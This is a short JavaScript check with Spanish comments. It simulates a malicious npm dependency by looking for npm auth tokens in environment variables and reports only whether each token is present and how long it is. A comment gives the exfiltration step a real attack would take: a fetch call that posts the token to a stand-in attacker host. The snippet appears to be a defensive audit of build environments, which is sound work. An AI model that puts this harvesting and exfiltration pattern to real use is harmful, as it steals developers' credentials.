// Simula lo que haria una dependencia maliciosa: buscar un token de npm que exfiltrar.
const candidatos = ['NODE_AUTH_TOKEN', 'NPM_TOKEN', 'NPM_AUTH_TOKEN'];
let encontrado = false;
for (const k of candidatos) {
  const v = process.env[k];
  if (v && v.length > 0) {
    encontrado = true;
    // Una dependencia maliciosa real haria aqui: fetch('https://atacante/...', { body: v })
    console.log(`🔴 TOKEN EXFILTRABLE: ${k} presente (longitud ${v.length})`);
  }
}
if (!encontrado) {
  console.log('🟢 No existe ningun token persistente de npm en el entorno: nada que exfiltrar.');
}